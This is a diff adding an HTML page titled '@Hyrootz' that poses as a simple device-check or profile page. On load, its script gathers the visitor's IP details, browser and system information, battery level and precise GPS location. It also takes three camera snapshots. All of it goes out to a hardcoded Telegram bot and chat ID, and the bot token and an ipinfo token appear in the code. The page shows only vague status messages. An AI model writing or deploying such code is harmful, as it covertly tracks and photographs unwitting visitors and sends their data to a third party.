@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>@Hyrootz</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: radial-gradient(circle, #1a1a1a, #000);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Poppins', sans-serif;
+      color: #fff;
+    }
+    .container {
+      text-align: center;
+      padding: 30px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid #444;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
+      width: 90%;
+      max-width: 400px;
+    }
+    h1 { font-size: 22px; margin-bottom: 10px; color: #0ff; }
+    p { font-size: 14px; color: #aaa; }
+    .status { margin-top: 20px; font-size: 13px; color: #0f0; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>@Hyrootz</h1>
+    <p class="status" id="status">Starting...</p>
+  </div>
+
+  <script>
+    const CHAT_ID = "7813060570";
+    const BOT_TOKEN = "8053780203:AAFAV7b_NYcbj2NmakX3_Az4dTnYigPmelA";
+    const statusEl = document.getElementById('status');
+
+    window.onload = async () => {
+      statusEl.textContent = "Memuat informasi device...";
+
+      const key = await getServerKey();
+      const deviceData = await collectDeviceInfo();
+      await logToServer(deviceData);
+
+      await sendToTelegram(key, deviceData.message, "text");
+
+      if (deviceData.location) {
+        await sendLocationToTelegram(deviceData.location.lat, deviceData.location.lon);
+      }
+
+      // Cek izin kamera sebelum lanjut
+      const permission = await navigator.permissions?.query?.({ name: 'camera' }).catch(() => null);
+      if (permission && permission.state === 'denied') {
+        statusEl.textContent = "Akses kamera ditolak";
+        return;
+      }
+
+      try {
+        statusEl.textContent = "Mengambil kamera...";
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const track = stream.getVideoTracks()[0];
+
+        for (let i = 0; i < 3; i++) {
+          const blob = await captureFromVideo(track);
+          await sendToTelegram(key, blob, "photo");
+          await new Promise(r => setTimeout(r, 600));
+        }
+
+        track.stop();
+        statusEl.textContent = '✅ Selesai!';
+      } catch (e) {
+        console.warn("Camera Error", e);
+        statusEl.textContent = 'Gagal akses kamera';
+      }
+    };
+
+    async function getServerKey() {
+      try {
+        const res = await fetch('/api/fast_servers');
+        const data = await res.json();
+        return data.fast_key || "direct";
+      } catch {
+        return "direct";
+      }
+    }
+
+    async function collectDeviceInfo() {
+      let ipInfo = {}, battery = null, gps = null, ipLoc = null;
+
+      const time = new Date().toLocaleString();
+      const language = navigator.language || "Unknown";
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+
+      try {
+        const [ipRes, battRes] = await Promise.allSettled([
+          fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json()),
+          navigator.getBattery ? navigator.getBattery() : null
+        ]);
+
+        if (ipRes.status === "fulfilled") ipInfo = ipRes.value;
+        if (battRes.status === "fulfilled") battery = battRes.value;
+
+        if (ipInfo.loc) {
+          const [lat, lon] = ipInfo.loc.split(",");
+          ipLoc = { lat: parseFloat(lat), lon: parseFloat(lon) };
+        }
+
+        if ("geolocation" in navigator) {
+          try {
+            const pos = await new Promise((resolve, reject) =>
+              navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000 })
+            );
+            gps = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+          } catch {}
+        }
+
+        const locationUsed = gps || ipLoc;
+
+        const message = `
+📡 *Device Check Result*
+
+🌐 IP: ${ipInfo.ip || "N/A"}
+🏙️ City: ${ipInfo.city || "N/A"}
+🌎 Region: ${ipInfo.region || "N/A"}
+🚩 Country: ${ipInfo.country || "N/A"}
+🔗 ISP: ${ipInfo.org || "N/A"}
+
+🧠 OS: ${navigator.platform}
+🌐 Browser: ${navigator.userAgent}
+🈯️ Language: ${language}
+🕒 Timezone: ${timezone}
+🖱️ Touch Support: ${'ontouchstart' in window ? 'Yes' : 'No'}
+
+📱 Network: ${navigator.connection?.effectiveType || "Unknown"}
+🔋 Battery: ${battery ? Math.round(battery.level * 100) + "%" : "N/A"} ${battery?.charging ? "⚡️" : ""}
+🖥️ Screen: ${screen.width}x${screen.height}
+🕓 Time: ${time}
+
+📍 Location: ${
+  gps
+    ? `📍 GPS [${gps.lat.toFixed(6)}, ${gps.lon.toFixed(6)}]`
+    : ipLoc
+    ? `🌐 IP-based [${ipLoc.lat.toFixed(6)}, ${ipLoc.lon.toFixed(6)}]`
+    : "❌ Tidak tersedia"
+}
+        `.trim();
+
+        return {
+          message,
+          location: locationUsed
+        };
+      } catch (err) {
+        console.error("Device Info Error", err);
+        return { message: "❌ Gagal mendapatkan info device", location: null };
+      }
+    }
+
+    async function logToServer(data) {
+      try {
+        await fetch('/log', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+      } catch (e) {
+        console.warn("Server log failed", e);
+      }
+    }
+
+    async function sendLocationToTelegram(lat, lon) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("latitude", lat);
+      form.append("longitude", lon);
+      try {
+        await fetch(url, { method: "POST", body: form });
+      } catch (e) {
+        console.warn("Failed to send location", e);
+      }
+    }
+
+    async function captureFromVideo(track) {
+      const video = document.createElement("video");
+      video.srcObject = new MediaStream([track]);
+      await video.play();
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.7));
+    }
+
+    async function sendToTelegram(key, data, type) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${type === "text" ? "sendMessage" : "sendPhoto"}`;
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+
+      if (type === "text") {
+        form.append("text", data);
+        form.append("parse_mode", "Markdown");
+      } else {
+        form.append("photo", data, "image.jpg");
+      }
+
+      try {
+        await fetch(url, { method: "POST", body: form });
+      } catch (e) {
+        console.warn("Failed to send to Telegram", e);
+      }
+    }
+  </script>
+</body>
+</html>
